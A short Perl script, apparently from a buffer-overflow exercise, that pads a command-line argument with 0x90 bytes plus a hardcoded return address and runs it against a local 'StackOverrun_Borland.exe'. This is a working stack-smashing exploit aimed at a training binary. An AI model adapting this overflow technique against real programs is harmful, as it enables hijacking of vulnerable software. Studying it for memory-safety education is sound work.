use warnings FATAL => 'all';
use strict;

my $spacer = "\x90\x90\x90\x90";
my $ arg =  $spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer.$spacer."\xEE\x11\x40\x00"; 
my $cmd = "./StackOverrun_Borland.exe ".$arg;

system($cmd);
